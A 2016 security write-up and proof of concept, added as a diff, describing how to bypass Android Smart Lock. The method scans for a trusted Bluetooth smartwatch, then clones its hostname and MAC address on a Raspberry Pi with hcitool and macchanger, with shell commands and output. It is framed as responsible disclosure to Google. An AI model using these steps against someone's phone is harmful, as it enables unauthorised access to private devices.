@@ -1,0 +1,108 @@
+
+        A write up and PoC of how to bypass the login/lock screen on an upto date android phone
+	               		  by Filip Kälebo (flipchan) 
+
+published on: Saturday 19 november 2016
+
+note:
+this is only for education purposes.
+
+reported to look at by the android sec team at the 10th of november. 
+found and reported by: security researcher Filip Kälebo (flipchan)
+
+
+I bought a cheap smartwatch from china and started useing it everyday for 3months with my nexus 5 phone that
+i connected to with the smartwatch useing bluetooth. after i been useing it for 3 months i started to 
+look at the smartlock function which is an function in android that lets login to your phone without entering
+the pincode whenever your smart watch is connected. My first thought was that there is probelly some hmac
+built in to my smart watch that is a copy of googles original smartwatch that verifies that the clock is legit.
+ After reading the documentation i could find about "smartlock". I found out that the smartlock function/application 
+
+works like this:
+it has a whitelist of "trusted devices" and when a trusted device is connected you dont need to enter a pincode
+because the phone knows that its your smart-device that is connected.
+So the way this whitelist works is that when you add a device the hostname and mac-address is saved as a trusted
+device. This is really easy to spoof all i as an attacker need to know is the hostname and mac address of the
+trusted device in this case a smartwatch. I can simply sit next to my target in starbucks for example and scan
+useing a bluetooth scanner to get the phones mac-address and then the smartwatches hostname and mac. and 
+when i have that i can then spoof the hostname and mac of the smartdevice and connect to the phone and then im
+in :)
+
+
+
+PoC and more:
+
+Devices i used:
+raspberry pi 3 - this is my fake smart watch, plus raspberrypi3 has bluetooth:)
+nexus 5 - my phone
+rwatch m26 - my smart watch i bought from china
+all devices has upto date software and os
+
+i downloaded the latest version of raspbian jessie and booted up that on my raspberry pi and installed the 
+packages i needed apt-get install bluetooth bluez blueman macchanger.
+i then turn on my smartwatch and phone with bluetooth and started the scan with my raspberry pi.
+root@raspberry:~#hcitool scan
+Scanning ...
+	30:11:E2:0E:62:61	smartwatch
+	64:89:9A:DC:F6:D9	NEXUS
+
+
+so  i got my phone at: 64:89:9A:DC:F6:D9
+and the smartwatch at: 30:11:E2:0E:62:61
+
+then i can simply copy "smartwatch" which is the hostname of the device i want to spoof.
+so simply:
+root@raspberry:~# echo 'smartwatch' > /etc/hostname
+root@raspberry:~# cat hostname
+smartwatch
+root@raspberry:~#
+
+then i need to change the mac address of the raspberry pi to 30:11:E2:0E:62:61 useing the package we downloaded
+called macchanger.
+root@raspberry:~#ifconfig eth0 down && macchanger --mac=30:11:E2:0E:62:61 eth0 && ifconfig eth0 up
+eth0      Link encap:Ethernet  HWaddr 30:11:e2:0e:62:61  
+          inet addr:192.168.1.8  Bcast:192.168.1.255  Mask:255.255.255.0
+          inet6 addr: fe80::fcf4:92a9:644b:fe79/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:13604 errors:0 dropped:1 overruns:0 frame:0
+          TX packets:734 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:849193 (829.2 KiB)  TX bytes:91298 (89.1 KiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:8 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:584 (584.0 B)  TX bytes:584 (584.0 B)
+(if you run wlan: root@raspberry:~#ifconfig wlan0 down && macchanger --mac=30:11:E2:0E:62:61 wlan0 && ifconfig wlan0 up)
+
+and then i turn off my smartwatch.
+
+then on the raspberry pi i dubble check that bluetooth is on :
+service bluetooth status
+● bluetooth.service - Bluetooth service
+   Loaded: loaded (/lib/systemd/system/bluetooth.service; enabled)
+   Active: active (running) since Sun 2016-10-30 14:38:04 UTC; 1h 7min ago
+     Docs: man:bluetoothd(8)
+ Main PID: 595 (bluetoothd)
+   Status: "Running"
+   CGroup: /system.slice/bluetooth.service
+           └─595 /usr/lib/bluetooth/bluetoothd
+
+the phone will auto-connect to my "fake-watch" because it is a trusted device and then i can simply take the 
+phone and get in without entering a pin when the phone is looked.
+
+
+
+
+thats it.
+summary:
+dont have trusted devices on your phone. i have talked to google androids sec-team and i recommend that they add some extra 
+authentication/verification like a hmac on. Im sure that they will figure something out.
+
+
+take care
+Sincerly flipchan
